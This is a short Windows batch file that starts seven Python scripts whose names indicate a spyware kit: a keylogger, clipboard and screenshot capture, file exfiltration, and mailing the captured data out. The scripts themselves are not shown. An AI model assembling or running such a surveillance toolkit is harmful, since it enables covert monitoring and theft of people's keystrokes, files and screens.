@echo off
REM Run all Python scripts with visible windows and exclude .bat files
start python clipboard_monitor.py
start python file_exfiltration.py
start python files_mail.py
start python keylogger_mail.py
start python keylogger.py
start python screenshot_capture.py
start python screenshot_mail.py

pause